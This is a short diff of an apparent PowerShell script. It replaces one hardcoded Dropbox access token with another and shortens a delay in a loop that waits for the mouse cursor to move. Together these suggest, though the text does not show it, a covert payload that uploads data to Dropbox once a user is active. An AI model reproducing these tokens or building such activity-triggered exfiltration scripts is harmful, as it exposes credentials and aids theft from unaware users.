@@ -16,7 +16,7 @@
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-$DropBoxAccessToken = "sl.BalEi8HJC8zKMNS5a67TR8tcWxE1-QxYOusW8G48fLPGgGUF_8OiWJqpgpGz1cRY5TTHlaEZsFfX5S-pvAtEP0i7D1ZBUyOyJ3KvAoQQ3NbEZixtIJGGJFzqiUAMf9XGSkCteGI"
+$DropBoxAccessToken = "sl.BamxulhMEDdnNzrSFK1BWwgWJ22sdBaVsbpgfS8aONKdATD_iPtyIm1-VM3ewa9IaP2GJbKmXXZ2_SAfGImq4mBF-_pgM0z-2369VzHmV7P41P-2RavGewwA2cDDvjmU9qLpl10"
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -152,7 +152,7 @@ $originalPOS = [System.Windows.Forms.Cursor]::Position.X
 $o=New-Object -ComObject WScript.Shell
 
     while (1) {
-        $pauseTime = 3
+        $pauseTime = 1
         if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
             break
         }
